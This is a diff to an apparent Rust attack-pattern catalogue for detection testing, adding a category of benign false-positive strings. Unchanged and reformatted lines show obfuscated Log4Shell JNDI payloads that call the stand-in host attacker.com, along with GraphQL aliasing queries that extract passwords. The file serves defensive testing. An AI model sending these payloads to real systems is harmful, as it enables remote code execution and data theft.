@@ -21,6 +21,7 @@ pub enum PatternCategory {
     PrototypePollution,
     Log4Shell,
     WebSocketInjection,
+    Benign,
 }
 
 /// An attack pattern with metadata
@@ -52,6 +53,7 @@ pub fn get_patterns_by_category(category: PatternCategory) -> Vec<AttackPattern>
         PatternCategory::PrototypePollution => prototype_pollution_patterns(),
         PatternCategory::Log4Shell => log4shell_patterns(),
         PatternCategory::WebSocketInjection => websocket_injection_patterns(),
+        PatternCategory::Benign => benign_patterns(),
     }
 }
 
@@ -312,7 +314,8 @@ fn graphql_injection_patterns() -> Vec<AttackPattern> {
             name: "GraphQL Batch Query Abuse".to_string(),
             category: PatternCategory::GraphQLInjection,
             pattern: r#"query { user(id: "1") { name } user(id: "2") { name } }"#.to_string(),
-            description: "GraphQL batching to extract multiple records in single request".to_string(),
+            description: "GraphQL batching to extract multiple records in single request"
+                .to_string(),
             risk_level: "HIGH".to_string(),
             cwe_id: Some("CWE-89".to_string()),
             owasp_category: Some("A03:2021".to_string()),
@@ -321,7 +324,9 @@ fn graphql_injection_patterns() -> Vec<AttackPattern> {
             id: "gql-003".to_string(),
             name: "GraphQL Field Aliasing".to_string(),
             category: PatternCategory::GraphQLInjection,
-            pattern: r#"query { alias1: user(id: 1) { password } alias2: user(id: 2) { password } }"#.to_string(),
+            pattern:
+                r#"query { alias1: user(id: 1) { password } alias2: user(id: 2) { password } }"#
+                    .to_string(),
             description: "GraphQL aliasing to extract sensitive data fields".to_string(),
             risk_level: "HIGH".to_string(),
             cwe_id: Some("CWE-200".to_string()),
@@ -394,7 +399,8 @@ fn log4shell_patterns() -> Vec<AttackPattern> {
             name: "Obfuscated Log4Shell".to_string(),
             category: PatternCategory::Log4Shell,
             pattern: "${${lower:j}ndi:${lower:l}dap://attacker.com/a}".to_string(),
-            description: "Obfuscated Log4j RCE using nested lookups and transformations".to_string(),
+            description: "Obfuscated Log4j RCE using nested lookups and transformations"
+                .to_string(),
             risk_level: "CRITICAL".to_string(),
             cwe_id: Some("CWE-917".to_string()),
             owasp_category: Some("A03:2021".to_string()),
@@ -403,7 +409,9 @@ fn log4shell_patterns() -> Vec<AttackPattern> {
             id: "l4s-004".to_string(),
             name: "Advanced Log4Shell Evasion".to_string(),
             category: PatternCategory::Log4Shell,
-            pattern: "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}".to_string(),
+            pattern:
+                "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}"
+                    .to_string(),
             description: "Advanced Log4Shell evasion using recursive expansion".to_string(),
             risk_level: "CRITICAL".to_string(),
             cwe_id: Some("CWE-917".to_string()),
@@ -444,6 +452,92 @@ fn websocket_injection_patterns() -> Vec<AttackPattern> {
             risk_level: "HIGH".to_string(),
             cwe_id: Some("CWE-1385".to_string()),
             owasp_category: Some("A03:2021".to_string()),
+        },
+    ]
+}
+
+/// Benign but suspicious-looking patterns for false positive testing
+fn benign_patterns() -> Vec<AttackPattern> {
+    vec![
+        AttackPattern {
+            id: "benign-001".to_string(),
+            name: "Blog post with SQL keywords".to_string(),
+            category: PatternCategory::Benign,
+            pattern: "Today I learned how to SELECT data FROM a database using WHERE clauses".to_string(),
+            description: "Legitimate blog content containing SQL keywords".to_string(),
+            risk_level: "NONE".to_string(),
+            cwe_id: None,
+            owasp_category: None,
+        },
+        AttackPattern {
+            id: "benign-002".to_string(),
+            name: "Valid path traversal".to_string(),
+            category: PatternCategory::Benign,
+            pattern: "/docs/../images/logo.png".to_string(),
+            description: "URL path with valid traversal for navigation".to_string(),
+            risk_level: "NONE".to_string(),
+            cwe_id: None,
+            owasp_category: None,
+        },
+        AttackPattern {
+            id: "benign-003".to_string(),
+            name: "JSON with angle brackets".to_string(),
+            category: PatternCategory::Benign,
+            pattern: r#"{"message": "<b>Hello</b> World"}"#.to_string(),
+            description: "Legitimate JSON containing HTML formatting tags".to_string(),
+            risk_level: "NONE".to_string(),
+            cwe_id: None,
+            owasp_category: None,
+        },
+        AttackPattern {
+            id: "benign-004".to_string(),
+            name: "Search query with boolean keywords".to_string(),
+            category: PatternCategory::Benign,
+            pattern: "search=red OR blue AND green".to_string(),
+            description: "Natural language search with OR/AND keywords".to_string(),
+            risk_level: "NONE".to_string(),
+            cwe_id: None,
+            owasp_category: None,
+        },
+        AttackPattern {
+            id: "benign-005".to_string(),
+            name: "HTML tutorial comment".to_string(),
+            category: PatternCategory::Benign,
+            pattern: "comment=I love the <script> tag in HTML tutorials".to_string(),
+            description: "Forum comment about HTML/JavaScript learning".to_string(),
+            risk_level: "NONE".to_string(),
+            cwe_id: None,
+            owasp_category: None,
+        },
+        AttackPattern {
+            id: "benign-006".to_string(),
+            name: "Valid percent-encoded name".to_string(),
+            category: PatternCategory::Benign,
+            pattern: "name=O%27Brien".to_string(),
+            description: "Legitimate name with apostrophe correctly encoded".to_string(),
+            risk_level: "NONE".to_string(),
+            cwe_id: None,
+            owasp_category: None,
+        },
+        AttackPattern {
+            id: "benign-007".to_string(),
+            name: "Mathematical expression".to_string(),
+            category: PatternCategory::Benign,
+            pattern: "calc=1+1=2 OR 2+2=4".to_string(),
+            description: "Math calculation that looks like SQL injection".to_string(),
+            risk_level: "NONE".to_string(),
+            cwe_id: None,
+            owasp_category: None,
+        },
+        AttackPattern {
+            id: "benign-008".to_string(),
+            name: "Legitimate XML content".to_string(),
+            category: PatternCategory::Benign,
+            pattern: r#"data=<note><to>User</to><from>Admin</from></note>"#.to_string(),
+            description: "Valid XML data without external entities".to_string(),
+            risk_level: "NONE".to_string(),
+            cwe_id: None,
+            owasp_category: None,
         },
     ]
 }
